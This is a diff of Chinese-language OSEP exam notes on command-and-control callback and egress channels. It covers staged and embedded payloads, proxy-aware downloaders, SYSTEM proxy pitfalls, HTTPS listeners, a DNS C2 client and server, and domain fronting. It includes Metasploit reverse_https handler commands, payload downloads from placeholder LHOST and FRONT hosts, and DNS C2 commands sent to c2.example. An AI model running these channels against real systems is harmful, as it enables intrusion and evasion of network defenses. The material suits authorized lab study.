@@ -1,27 +1,23 @@
-::: warning Authorized use only
-For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
+::: warning 仅限授权使用
+本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
 :::
 
-# Module M09：C2 回连与出网通道（分阶段 / 代理 / DNS / 域前置）
+# 模块 M09：C2 回连与出网通道（分阶段 / 代理 / DNS / 域前置）
 
-User vs SYSTEM proxy. Every stage of a staged payload uses the same proven path.
+> 覆盖场景：17、28、29、30、31、32、33
+> > 前置依赖：攻击机（Kali）+ 一个入口会话；HTTPS 需自签证书（生成见 [00-environment-and-infra](/zh/modules/00-environment-and-infra) §3）；DNS 通道需一个可把 NS 指向你的域或实验网允许的直连 UDP 53；域前置需可自定义 Host 转发的 CDN/自建 nginx 前端。
 
-Switch to **中文** in the header for the original full narrative. Lab listings on this page are complete.
-
-> Covers scenarios：17、28、29、30、31、32、33
-> > Prerequisites：attacker box（Kali）+ 一个入口会话；HTTPS 需自签证书（生成见 [00-environment-and-infra](/modules/00-environment-and-infra) §3）；DNS 通道需一个可把 NS 指向你的域或实验网允许的直连 UDP 53；域前置需可自定义 Host 转发的 CDN/自建 nginx 前端。
-
-**核心思想**：本模块解决"代码能跑但会话/第二阶段回不来"的问题。所有方案都围绕一条**已Verify可达的通信路径**展开——先Verify路径（投递、代理、DNS 解析、TLS 握手），再让每个阶段走同一条路径。任何阶段换了地址/端口/协议/代理上下文，都是场景 30 的翻版。
+**核心思想**：本模块解决"代码能跑但会话/第二阶段回不来"的问题。所有方案都围绕一条**已验证可达的通信路径**展开——先验证路径（投递、代理、DNS 解析、TLS 握手），再让每个阶段走同一条路径。任何阶段换了地址/端口/协议/代理上下文，都是场景 30 的翻版。
 
 ---
 
-## Scenario 17：目标没有稳定出网能力，下载式第二阶段无法取得
+## 场景 17：目标没有稳定出网能力，下载式第二阶段无法取得
 
-**Situation**：入口能执行代码，但目标访问不到文件服务器、只放行少数地址，依赖临时下载的宏/脚本/加载器全部失败。
+**场景回顾**：入口能执行代码，但目标访问不到文件服务器、只放行少数地址，依赖临时下载的宏/脚本/加载器全部失败。
 
-**Assumptions**：有可执行代码的入口（VBA / HTA / JScript，见 M01–M03）；我方把第二阶段放在外网文件服务器上；目标侧 DNS 解析或任意出网到该服务器失败；shellcode 与 runner 已就绪。
+**前提与假设**：有可执行代码的入口（VBA / HTA / JScript，见 M01–M03）；我方把第二阶段放在外网文件服务器上；目标侧 DNS 解析或任意出网到该服务器失败；shellcode 与 runner 已就绪。
 
-**Prepare (attacker)**：把每种入口的 payload 都做成**两套并存**：内嵌版（shellcode + runner 全在单文件/单次进程内完成，0 次外部下载）与下载版（stager → 从attacker box取第二阶段）。不要只留一种，考试里切换形态重做非常费时。
+**准备（攻击机侧）**：把每种入口的 payload 都做成**两套并存**：内嵌版（shellcode + runner 全在单文件/单次进程内完成，0 次外部下载）与下载版（stager → 从攻击机取第二阶段）。不要只留一种，考试里切换形态重做非常费时。
 
 ```bash
 # 内嵌版准备：生成 shellcode（先确认目标位数，x86/x64 分开存）
@@ -32,14 +28,14 @@ cp ~/osep/payloads/win/x64/run.ps1 ~/osep/payloads/PAYLOAD
 python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads   # 请求日志确认"是否真的下载"
 ```
 
-**Procedure**：
+**执行步骤**：
 1. 先用无害回调确认入口执行（回调 ping / nslookup / 写文件，见 M01），**不要**直接跑下载版——如果回调都出不去，下载必然失败。
 2. 确认目标出网能力：从目标侧 `Test-NetConnection LHOST -Port 80/443`、`nslookup URL`，记录哪条路径通。
 3. 能出网 → 用下载版 stager（文档 `docs/01` 场景 3、`docs/03` 场景 9 的下载执行形态）；不能 → 换内嵌版，把第二阶段直接内嵌进 runner 单文件投递。
 4. 内嵌版仍太大/被杀（场景 18–19）→ 用 M03 的"桥接 + C# 第二阶段"把重量级逻辑挪到内存内 JScript/C#，仍不落地不下载。
 5. 投递后观察 m00 服务器日志（有无 GET）与监听端（会话是否建立）。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m00-delivery-server.py` | 下载版的投递 + 请求日志 | `--port 80 --dir ~/osep/payloads` |
@@ -484,24 +480,24 @@ try {
 }
 ````
 
-**Verify**：m00 日志出现目标 IP 的 GET → 下载链路通；监听端出现会话 → 完整链路通；无任何日志/会话时对照"回调三件套"确认是入口没执行还是出网被拦。
+**验证**：m00 日志出现目标 IP 的 GET → 下载链路通；监听端出现会话 → 完整链路通；无任何日志/会话时对照"回调三件套"确认是入口没执行还是出网被拦。
 
-**If it fails**：
+**失败分支与备选**：
 - 目标完全无出网（含 DNS 出网都不通）→ 放弃回连类方案，改"离线落地型"：落地+计划任务/服务常驻，把结果写文件由别的入口取回（M01 场景 5）。
 - 只放行少数域名/端口 → 走代理（场景 28）或域前置（场景 33）或 HTTPS 443（场景 31）。
 - 内嵌版被执行但秒退 → 位数不匹配或 shellcode 生成时架构错误，用 archbranch 版本（M01）。
 
-**Exam notes / OPSEC**：内嵌与下载两版在**不同目录**保存并注释清楚，避免投错文件浪费 10 分钟；内嵌 shellcode 默认有静态特征，需要时按 M05 编码/加密；"能执行代码 ≠ 能出网"，先Verify路径再跑 payload。
+**考试注意 OPSEC**：内嵌与下载两版在**不同目录**保存并注释清楚，避免投错文件浪费 10 分钟；内嵌 shellcode 默认有静态特征，需要时按 M05 编码/加密；"能执行代码 ≠ 能出网"，先验证路径再跑 payload。
 
 ---
 
-## Scenario 28：普通用户能通过浏览器联网，自定义 payload 无法直接回连
+## 场景 28：普通用户能通过浏览器联网，自定义 payload 无法直接回连
 
-**Situation**：目标只允许经企业代理访问外网，浏览器正常，直接 TCP 或忽略代理的 HTTP 客户端失败。
+**场景回顾**：目标只允许经企业代理访问外网，浏览器正常，直接 TCP 或忽略代理的 HTTP 客户端失败。
 
-**Assumptions**：有普通用户会话并能执行 PowerShell；目标配置了系统/用户代理（HKCU Internet Settings 或浏览器内置代理）；代理可能需要 NTLM 认证（域用户上下文通常能透传）。
+**前提与假设**：有普通用户会话并能执行 PowerShell；目标配置了系统/用户代理（HKCU Internet Settings 或浏览器内置代理）；代理可能需要 NTLM 认证（域用户上下文通常能透传）。
 
-**Prepare (attacker)**：起投递服务器/HTTPS 监听（m00 或 m09-https-listener.sh）；从目标侧先读代理配置，确认走代理是否就能到你的地址。
+**准备（攻击机侧）**：起投递服务器/HTTPS 监听（m00 或 m09-https-listener.sh）；从目标侧先读代理配置，确认走代理是否就能到你的地址。
 
 ```powershell
 # 目标侧：读用户代理设置（WinINet）
@@ -509,36 +505,36 @@ reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v 
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable
 ```
 
-**Procedure**：
+**执行步骤**：
 1. 用 `m09-proxy-aware-downloader.ps1` 做连通性测试：默认模式自动取系统代理并下载一个无害文件（m00 日志里能看到 GET）。
 2. 407（代理认证失败）→ 加 `-ProxyUser DOMAIN\USER -ProxyPass PASS`（或 `-DefaultCreds` 用当前令牌透传 NTLM）。
 3. 确认能下载后，把同一路径用于回连：HTTPS reverse handler 的端口/地址要走得到（443 最稳）；PowerShell stager 下载执行也加同样的代理参数。
 4. 记录"用户上下文 + 代理 → 通"，为场景 29 做对照。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m09-proxy-aware-downloader.ps1` | 系统代理/显式代理下载，支持认证 | `-Url http://LHOST/PAYLOAD -OutFile` 或 `-Command` |
 | `m00-delivery-server.py` | 投递 + 确认目标请求 | `--port 80 --dir ~/osep/payloads` |
 
-**Verify**：m00 日志出现来自代理/目标的 GET；`-Command` 模式下载的脚本执行后有回调输出；测试文件内容与源一致。
+**验证**：m00 日志出现来自代理/目标的 GET；`-Command` 模式下载的脚本执行后有回调输出；测试文件内容与源一致。
 
-**If it fails**：
+**失败分支与备选**：
 - 浏览器用内置代理（Firefox 单独配置）而系统代理为空 → 从浏览器设置里读出代理地址，改用显式 `-ProxyUrl http://proxy:port`。
 - 代理要认证且当前令牌不过 → 用已知凭据 `-ProxyUser/-ProxyPass`；只有明文 HTTP 代理时凭据会暴露给代理，尽量让流量是 HTTPS。
 - 代理只放行白名单域名 → 域前置（场景 33）或 DNS（场景 32）。
 
-**Exam notes / OPSEC**：代理日志能看到目的 URL → 下载阶段用无特征文件名，回连阶段走 HTTPS；同一会话里保持 UA 一致（m09 脚本默认带浏览器 UA）；不要把域凭据明文留在命令行历史里，必要时用 `-DefaultCreds`。
+**考试注意 OPSEC**：代理日志能看到目的 URL → 下载阶段用无特征文件名，回连阶段走 HTTPS；同一会话里保持 UA 一致（m09 脚本默认带浏览器 UA）；不要把域凭据明文留在命令行历史里，必要时用 `-DefaultCreds`。
 
 ---
 
-## Scenario 29：用户权限会话能回连，提升为 SYSTEM 后却失联
+## 场景 29：用户权限会话能回连，提升为 SYSTEM 后却失联
 
-**Situation**：同一台机器、同一个地址，提权前通信正常，SYSTEM 身份下失败——两种身份用的代理设置和认证上下文不同。
+**场景回顾**：同一台机器、同一个地址，提权前通信正常，SYSTEM 身份下失败——两种身份用的代理设置和认证上下文不同。
 
-**Assumptions**：已从用户会话提权到 SYSTEM（服务、计划任务、令牌复制等入口）；企业出网必须经代理；用户态代理配置在 HKCU（WinINet），SYSTEM 默认走 WinHTTP（`netsh winhttp`），两者**不共享**，且 SYSTEM 没有用户的认证凭据上下文。
+**前提与假设**：已从用户会话提权到 SYSTEM（服务、计划任务、令牌复制等入口）；企业出网必须经代理；用户态代理配置在 HKCU（WinINet），SYSTEM 默认走 WinHTTP（`netsh winhttp`），两者**不共享**，且 SYSTEM 没有用户的认证凭据上下文。
 
-**Prepare (attacker)**：起监听；在目标侧先对比两条代理链的输出：
+**准备（攻击机侧）**：起监听；在目标侧先对比两条代理链的输出：
 
 ```cmd
 rem 目标侧（用户 shell）
@@ -550,51 +546,51 @@ whoami                            rem 确认 nt authority\system
 netsh winhttp show proxy
 ```
 
-**Procedure**：
+**执行步骤**：
 1. 提权前记录"用户 + 代理"能通的证据（场景 28 的输出）。
-2. 提权后先做最小Verify：SYSTEM 下直接 TCP/下载是否通。若不通，查 WinHTTP 代理是否为空/与用户不一致。
+2. 提权后先做最小验证：SYSTEM 下直接 TCP/下载是否通。若不通，查 WinHTTP 代理是否为空/与用户不一致。
 3. 方案 A（改机器代理，需管理员，SYSTEM 已具备）：`netsh winhttp set proxy proxy-server="http://proxy:8080" bypass-list="<local>"`，先记下 `netsh winhttp show proxy` 原值便于回滚，用毕 `netsh winhttp reset proxy`。
 4. 方案 B（不改机器）：SYSTEM 会话里用支持显式代理参数的下载器/客户端（`m09-proxy-aware-downloader.ps1 -ProxyUrl ... -ProxyUser ...`），让每个组件自己带代理。
 5. 方案 C（认证上下文问题）：若代理对 SYSTEM 的匿名/NTLM 认证失败，把需要出网的 payload 放回用户上下文执行（如计划任务以用户身份跑），或走不需要代理认证的通道（DNS 场景 32）。
 6. 回连路径通了再让 handler 进入第二阶段，全程记录代理参数。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m09-proxy-aware-downloader.ps1` | 双上下文下载器；SYSTEM 下用显式代理 | `-ProxyUrl http://proxy:8080 -DefaultCreds` |
-| `m00-delivery-server.py` | Verify SYSTEM 是否真的请求到投递地址 | `--port 80` |
+| `m00-delivery-server.py` | 验证 SYSTEM 是否真的请求到投递地址 | `--port 80` |
 
-**Verify**：SYSTEM 上下文下 m00 日志出现 GET；或 `netsh winhttp show proxy` 显示代理已设置后回连成功；对照组（改前/改后）输出差异要能解释。
+**验证**：SYSTEM 上下文下 m00 日志出现 GET；或 `netsh winhttp show proxy` 显示代理已设置后回连成功；对照组（改前/改后）输出差异要能解释。
 
-**If it fails**：
+**失败分支与备选**：
 - 不允许改机器代理（会破坏系统服务出网）→ 用 M08 隧道：在目标可达位置做转发，让流量经用户上下文/跳板。
 - 代理对 SYSTEM 无可用凭据 → 用户上下文派生一个带凭据的进程执行出网段，或换 DNS 通道。
 - 提权入口本身就是服务重启等无交互形态 → 把代理参数写死在 payload 命令行里再触发。
 
-**Exam notes / OPSEC**：`netsh winhttp set proxy` 影响**整机**，考试网络里可能影响其他服务甚至被判为破坏——一定先保存原值、用完 reset；SYSTEM 回连尽量 443/80 常规端口；把"用户 vs SYSTEM"两条路径各测一次并记录，别在 SYSTEM 下反复试用户态的参数浪费时间。
+**考试注意 OPSEC**：`netsh winhttp set proxy` 影响**整机**，考试网络里可能影响其他服务甚至被判为破坏——一定先保存原值、用完 reset；SYSTEM 回连尽量 443/80 常规端口；把"用户 vs SYSTEM"两条路径各测一次并记录，别在 SYSTEM 下反复试用户态的参数浪费时间。
 
 ---
 
-## Scenario 30：第一阶段回连成功，第二阶段始终没有出现
+## 场景 30：第一阶段回连成功，第二阶段始终没有出现
 
-**Situation**：入口成功联系监听端，但后续阶段用了另一地址/端口/协议，那条路径不被目标允许，或根本没被配置。
+**场景回顾**：入口成功联系监听端，但后续阶段用了另一地址/端口/协议，那条路径不被目标允许，或根本没被配置。
 
-**Assumptions**：第一阶段（stager/回调）已通；监听与投递基础设施在attacker box侧已按 `docs/00` 固定端口规划（80 投递、443 回连、4444 备用）。
+**前提与假设**：第一阶段（stager/回调）已通；监听与投递基础设施在攻击机侧已按 `docs/00` 固定端口规划（80 投递、443 回连、4444 备用）。
 
-**Prepare (attacker)**：给每个会话建一张"路径卡片"，字段固定：入口 → 下载地址/协议/端口 → 监听地址/协议/端口 → 代理上下文 → UA。任何阶段换路径先改卡片再执行。
+**准备（攻击机侧）**：给每个会话建一张"路径卡片"，字段固定：入口 → 下载地址/协议/端口 → 监听地址/协议/端口 → 代理上下文 → UA。任何阶段换路径先改卡片再执行。
 
-**Procedure**：
+**执行步骤**：
 1. 定位断点：第二阶段如果是"下载执行"，看 m00/nginx 日志有没有来自目标的第二阶段 GET；没有 → 目标没走到下载地址；有但无会话 → 执行/位数问题（转 M05）。
 2. 常见根因逐条排除：
    - 地址不一致：stager 里写的 LHOST 是内网地址或 localhost，监听在另一张网卡 —— 统一用同一张网卡 IP。
    - 端口不一致：生成 payload 时 LPORT=4444，监听开在 443。
-   - 协议不一致：第一阶段 HTTP 通，第二阶段 reverse_https 被出口拦 → 全阶段用已Verify协议（443/HTTPS 或代理路径）。
+   - 协议不一致：第一阶段 HTTP 通，第二阶段 reverse_https 被出口拦 → 全阶段用已验证协议（443/HTTPS 或代理路径）。
    - 代理上下文：第一阶段在用户上下文能下载，第二阶段由 SYSTEM 触发（见场景 29）。
    - 投递服务器没起 / 目录名错 / `PAYLOAD` 文件名大小写或路径不一致。
 3. 最稳做法：**stageless**（一次连接带全部）替代 staged（先连再取），避免第二阶段天生依赖第二条路径；必须 staged 时两阶段走同一投递服务器同一条 URL 模板。
 4. 监听端设置 `set ExitOnSession false`，避免第一个会话断了就关掉整个 handler。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m09-https-listener.sh` | 统一 HTTPS/HTTP handler 入口 | `--mode msf --payload windows/x64/meterpreter/reverse_https` |
@@ -922,35 +918,35 @@ esac
 exit 0
 ````
 
-**Verify**：路径卡片上每个阶段都有"该路径实测通过"标记（投递日志 GET / 握手日志 / 会话）；断开后重连（ExitOnSession false）仍能回来。
+**验证**：路径卡片上每个阶段都有"该路径实测通过"标记（投递日志 GET / 握手日志 / 会话）；断开后重连（ExitOnSession false）仍能回来。
 
-**If it fails**：
+**失败分支与备选**：
 - 目标请求了第二阶段但进程被终止 → 静态/行为检测，按 M05 场景 18–19 处理，别继续换地址。
 - 请求根本没到 → 对照 28/29 检查代理与身份上下文。
 - staged 反复失败 → 换 stageless 单条路径；仍失败再检查监听 payload 位数（x86/x64）。
 
-**Exam notes / OPSEC**：考试丢分重灾区是"第一阶段通了就以为成功"，必须看到第二阶段会话才进入下一步；每阶段记录路径卡片，避免靠记忆猜 URL/端口。
+**考试注意 OPSEC**：考试丢分重灾区是"第一阶段通了就以为成功"，必须看到第二阶段会话才进入下一步；每阶段记录路径卡片，避免靠记忆猜 URL/端口。
 
 ---
 
-## Scenario 31：目标只允许 HTTPS，但 HTTPS 检查影响通信
+## 场景 31：目标只允许 HTTPS，但 HTTPS 检查影响通信
 
-**Situation**：目标能访问普通 HTTPS 网站，我方 payload 在 TLS 握手或请求阶段失败——存在代理检查、证书信任或应用层（UA/路径）过滤。
+**场景回顾**：目标能访问普通 HTTPS 网站，我方 payload 在 TLS 握手或请求阶段失败——存在代理检查、证书信任或应用层（UA/路径）过滤。
 
-**Assumptions**：出口只放行 443/HTTPS；可能存在 TLS 中间盒（MITM 重签）或只放行到白名单域名的检查；我方监听侧能提供 HTTPS 服务并查看握手/请求日志。
+**前提与假设**：出口只放行 443/HTTPS；可能存在 TLS 中间盒（MITM 重签）或只放行到白名单域名的检查；我方监听侧能提供 HTTPS 服务并查看握手/请求日志。
 
-**Prepare (attacker)**：生成证书并起 HTTPS 投递/监听，两种证书策略都备好：
+**准备（攻击机侧）**：生成证书并起 HTTPS 投递/监听，两种证书策略都备好：
 - 自签：`openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem -subj "/CN=LHOST"`（目标不校验根时可过；**记下指纹**便于排错）。
 - 可信证书：公网域名 + Let's Encrypt（出口无 MITM 时最稳）；实验网内若有校内 CA 也可导入信任。
 
-**Procedure**：
+**执行步骤**：
 1. 分点定位：目标能否 TCP 连到你的 443（`Test-NetConnection LHOST -Port 443`）→ 能连但 TLS 失败 → 证书/中间盒问题；连都连不上 → 出口按 IP/SNI 过滤。
 2. 握手失败排证书：看 HTTPS 监听日志记录握手是否发生、客户端报错（证书不受信 / 主机名不匹配）。自签证书在 PowerShell 里默认拒绝 → 客户端加 `-SkipCertificateCheck`（PS 7）或 `ServerCertificateValidationCallback`（PS 5，脚本内处理），或把自签证书加入目标受信根。
 3. 中间盒 MITM 重签：目标信任的是中间盒的根 → 自签必然失败 → 换"中间盒放行的域名 + 可信证书"（见失败分支与域前置 33）。
 4. 应用层过滤排 UA/路径：请求头伪装常见浏览器 UA（m09-https-listener.sh 记录 UA 供核对）；路径/查询串无特征。
 5. 若目标要求经代理访问 HTTPS → 组合场景 28：代理参数 + HTTPS 客户端。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m09-https-listener.sh` | HTTPS 监听：msf reverse_https handler 或 TLS 测试模式，记录 UA/握手 | `--mode msf\|ssl-test --cert cert.pem --key key.pem` |
@@ -1102,33 +1098,33 @@ http {
 # ============================================================
 ````
 
-**Verify**：握手日志显示目标完成 TLS（或 msf 出现会话）；对比"目标访问公网 HTTPS 正常 vs 访问我们失败"的差异点已消除。
+**验证**：握手日志显示目标完成 TLS（或 msf 出现会话）；对比"目标访问公网 HTTPS 正常 vs 访问我们失败"的差异点已消除。
 
-**If it fails**：
+**失败分支与备选**：
 - 中间盒重签且校验链 → 找中间盒放行的域名做域前置（33），或确认实验环境是否有豁免。
 - 出口按 SNI/目的 IP 白名单 → 域前置（33）；连白名单外域名都不给解析 → DNS 通道（32）。
 - 客户端不校验但握手仍失败 → 确认 TLS 版本/密码套件（WinHTTP 默认 OK，老系统可能要降级配置）。
 
-**Exam notes / OPSEC**：自签证书指纹明显，排错先确认监听日志里是你自己的指纹；UA 与投递/下载阶段保持一致，别一半默认一半伪装；HTTPS 不加密代理头的 Host/SNI，别把机密放 URL。
+**考试注意 OPSEC**：自签证书指纹明显，排错先确认监听日志里是你自己的指纹；UA 与投递/下载阶段保持一致，别一半默认一半伪装；HTTPS 不加密代理头的 Host/SNI，别把机密放 URL。
 
 ---
 
-## Scenario 32：普通 HTTP(S) 通信不通，但课程实验允许 DNS 通道
+## 场景 32：普通 HTTP(S) 通信不通，但课程实验允许 DNS 通道
 
-**Situation**：目标能执行代码，直接连接与常规代理均不可用，但目标仍可用 DNS 出网。
+**场景回顾**：目标能执行代码，直接连接与常规代理均不可用，但目标仍可用 DNS 出网。
 
-**Assumptions**：实验/考试环境明确允许 DNS 隧道（教材 §14.7）；你有一个域（或实验网内允许的域名）且能把 NS 记录指向attacker box，或目标能直接 UDP 53 到达attacker box；target上能执行我们的客户端（Python 3 需解释器；无解释器时换 dnscat2/iodine 或 PowerShell 移植版，脚本注释已说明）。
+**前提与假设**：实验/考试环境明确允许 DNS 隧道（教材 §14.7）；你有一个域（或实验网内允许的域名）且能把 NS 记录指向攻击机，或目标能直接 UDP 53 到达攻击机；目标机上能执行我们的客户端（Python 3 需解释器；无解释器时换 dnscat2/iodine 或 PowerShell 移植版，脚本注释已说明）。
 
-**Prepare (attacker)**：本模块自带最小 DNS C2 对（`m09-dns-c2-server.py` + `m09-dns-c2-client.py`），用于"确认 DNS 通道可用 + 传命令取回输出"。完整隧道工具 dnscat2/iodine 需要时再上。本实验直接让目标连attacker box UDP 53：
+**准备（攻击机侧）**：本模块自带最小 DNS C2 对（`m09-dns-c2-server.py` + `m09-dns-c2-client.py`），用于"确认 DNS 通道可用 + 传命令取回输出"。完整隧道工具 dnscat2/iodine 需要时再上。本实验直接让目标连攻击机 UDP 53：
 
 ```bash
-# attacker box：起权威式 DNS C2 服务器（占 53 需要 root）
+# 攻击机：起权威式 DNS C2 服务器（占 53 需要 root）
 sudo python3 m09-dns-c2-server.py --listen 0.0.0.0 --port 53 \
     --domain c2.example --outdir ~/osep/logs
 # 服务器控制台输入:  SESSIONID  whoami /priv     # 给指定会话发命令
 ```
 
-**Procedure**：
+**执行步骤**：
 1. 目标侧确认 DNS 可达：`nslookup c2.example LHOST`（直连）或正常 `nslookup` 递归（取决于环境）。
 2. 目标侧起客户端（无 Python 时先传解释器或换 dnscat2 二进制）：
 ```bash
@@ -1139,7 +1135,7 @@ python3 m09-dns-c2-client.py --server LHOST --port 53 --domain c2.example \
 4. 服务器端确认收到输出（终端打印 / outdir 落盘）。DNS 查询在出口处就是普通 A 查询，路径上不经过代理。
 5. 通道稳定后把第二阶段也改由 DNS 投递（不落地、少请求），或仅用 DNS 做应急回传。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m09-dns-c2-server.py` | DNS C2 服务端（UDP 53，A 记录应答） | `--listen 0.0.0.0 --port 53 --domain c2.example` |
@@ -1606,25 +1602,25 @@ if __name__ == "__main__":
 # ============================================================
 ````
 
-**Verify**：服务器控制台收到会话心跳（`[+] session ...`）并打印命令输出；`tcpdump -i eth0 udp port 53` 能看到规律的 `x.<session>.c2.example` 查询。
+**验证**：服务器控制台收到会话心跳（`[+] session ...`）并打印命令输出；`tcpdump -i eth0 udp port 53` 能看到规律的 `x.<session>.c2.example` 查询。
 
-**If it fails**：
+**失败分支与备选**：
 - 出口 DNS 只解析内网/被强制走内网 DNS → 内网 DNS 是否能把 `c2.example` 转发给你的权威服务器？不行则此场景不通（换 28/31）。
 - 目标无 Python 解释器 → 用编译好的 dnscat2 客户端，或把客户端逻辑移植成 PowerShell（用 `Resolve-DnsName`），脚本头注释给出移植要点。
 - 隧道被封（请求频率/长标签检测）→ 降 `--interval`、缩短单包负载、命令少而精。
 - UDP 53 被拦但 TCP 53 通 → 需支持 TCP 的隧道工具（dnscat2 支持），自写脚本仅覆盖 UDP。
 
-**Exam notes / OPSEC**：长 hex 子域 + 高频心跳是强检测特征，只在该实验规则允许时使用（场景前提写明"课程实验允许"）；命令输出别一次拉太大；DNS 服务器起在 53 前确认端口空闲且不会被目标出口策略单独拦。
+**考试注意 OPSEC**：长 hex 子域 + 高频心跳是强检测特征，只在该实验规则允许时使用（场景前提写明"课程实验允许"）；命令输出别一次拉太大；DNS 服务器起在 53 前确认端口空闲且不会被目标出口策略单独拦。
 
 ---
 
-## Scenario 33：目标限制访问目的域名，且实验基础设施支持域前置
+## 场景 33：目标限制访问目的域名，且实验基础设施支持域前置
 
-**Situation**：目标只允许访问特定前端地址，直接访问后端不通；实验基础设施支持"前端与后端分离"（教材 §14.6）。
+**场景回顾**：目标只允许访问特定前端地址，直接访问后端不通；实验基础设施支持"前端与后端分离"（教材 §14.6）。
 
-**Assumptions**：有一个目标**允许访问**的前端地址（FRONT 域名/IP）；存在一个能按 HTTP Host 头把请求路由到后端的设施——真实 CDN（如 Azure Front Door）或自建 nginx 反向代理模拟；后端 = 你的 C2/投递服务器。**域前置成立的关键**：出口检查看到的是 TLS SNI/目的地址 = FRONT（放行），而 HTTP Host 头 = 后端路由用。
+**前提与假设**：有一个目标**允许访问**的前端地址（FRONT 域名/IP）；存在一个能按 HTTP Host 头把请求路由到后端的设施——真实 CDN（如 Azure Front Door）或自建 nginx 反向代理模拟；后端 = 你的 C2/投递服务器。**域前置成立的关键**：出口检查看到的是 TLS SNI/目的地址 = FRONT（放行），而 HTTP Host 头 = 后端路由用。
 
-**Prepare (attacker)**：自建实验室版前端 nginx（443 + FRONT 证书）+ 后端监听：
+**准备（攻击机侧）**：自建实验室版前端 nginx（443 + FRONT 证书）+ 后端监听：
 
 ```bash
 # nginx 前端配置见 m09-domain-fronting-nginx.conf
@@ -1633,7 +1629,7 @@ bash m09-https-listener.sh --mode ssl-test --cert cert.pem --key key.pem --port 
 # 或 msf: use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; run
 ```
 
-**Procedure**：
+**执行步骤**：
 1. 目标侧确认到 FRONT:443 通（`Test-NetConnection FRONT -Port 443`），到后端直连不通。
 2. 客户端访问模板——TLS 连 FRONT，HTTP 头带后端 Host：
 ```bash
@@ -1645,24 +1641,24 @@ curl -k https://FRONT/ -H "Host: BACKEND" --resolve FRONT:443:FRONT_IP -o PAYLOA
 # $c = New-Object Net.WebClient; $c.Headers.Add("Host","BACKEND"); $c.DownloadString("https://FRONT/PAYLOAD")
 ```
 3. nginx 前端按 Host 路由：Host=FRONT → 正常页面（掩护）；Host=BACKEND → `proxy_pass` 到后端监听。出口处看到的只有 FRONT（SNI/证书/目的域名都匹配放行规则）。
-4. Verify：后端监听收到来自目标的请求（来源会是前端 IP 或目标 IP，取决于代理位置）；下载/会话成功。
-5. 真实 CDN 版：把 BACKEND 注册为 CDN 后端源站，前端域名用目标放行的那个；先做一次无害 GET Verify路由再上 payload。
+4. 验证：后端监听收到来自目标的请求（来源会是前端 IP 或目标 IP，取决于代理位置）；下载/会话成功。
+5. 真实 CDN 版：把 BACKEND 注册为 CDN 后端源站，前端域名用目标放行的那个；先做一次无害 GET 验证路由再上 payload。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m09-domain-fronting-nginx.conf` | 自建域前置前端（按 Host 路由到后端） | 替换 FRONT / BACKEND / 证书路径 |
 | `m09-https-listener.sh` | 后端 HTTPS 监听/投递 | `--port 8443` |
 | `m09-proxy-aware-downloader.ps1` | 目标侧下载（可设 Host 头） | `-Url https://FRONT/PAYLOAD -HostHeader BACKEND` |
 
-**Verify**：后端监听/nginx 日志出现目标请求且 Host=BACKEND；无害 GET 先通再上真实 payload；出口侧（如有抓包机会）确认只见 FRONT。
+**验证**：后端监听/nginx 日志出现目标请求且 Host=BACKEND；无害 GET 先通再上真实 payload；出口侧（如有抓包机会）确认只见 FRONT。
 
-**If it fails**：
+**失败分支与备选**：
 - 前端按 SNI 而非 Host 路由 / 检查 SNI 与 Host 一致性 → 域前置不可用 → 回场景 28（代理）或 32（DNS）。
 - CDN 不转发自定义 Host（很多 CDN 会 502/拒绝）→ 该实验基础设施不支持，改用自建前端，或放弃。
 - 目标只放行 FRONT 且 FRONT 不是你能控制证书的域名 → 需要借用其证书链，通常不可行 → 换通道。
 
-**Exam notes / OPSEC**：场景 33 是**基础设施依赖型**（场景原文明确"依赖具体服务支持"）——考前用无害 GET Verify一次路由，考试里不要第一次就上 payload；域前置需要 Host 与 SNI 分离的理解，说不清机制就不要在报告里硬写。
+**考试注意 OPSEC**：场景 33 是**基础设施依赖型**（场景原文明确"依赖具体服务支持"）——考前用无害 GET 验证一次路由，考试里不要第一次就上 payload；域前置需要 Host 与 SNI 分离的理解，说不清机制就不要在报告里硬写。
 
 ---
 
@@ -1704,4 +1700,4 @@ bash m09-https-listener.sh --mode msf --cert cert.pem --key key.pem
 | `m09-domain-fronting-nginx.conf` | 33、31 |
 | `m09-https-listener.sh` | 30、31、33 |
 
-跨模块引用：`m00-delivery-server.py`（17/28/30 投递与日志）、`m01-shellcode-runner-vba-archbranch.vba`（17 内嵌）、`m03-dotnettojscript-loader.js`（17 桥接）、[08-pivoting-tunneling](/modules/08-pivoting-tunneling)（29/30 隧道备选）。
+跨模块引用：`m00-delivery-server.py`（17/28/30 投递与日志）、`m01-shellcode-runner-vba-archbranch.vba`（17 内嵌）、`m03-dotnettojscript-loader.js`（17 桥接）、[08-pivoting-tunneling](/zh/modules/08-pivoting-tunneling)（29/30 隧道备选）。
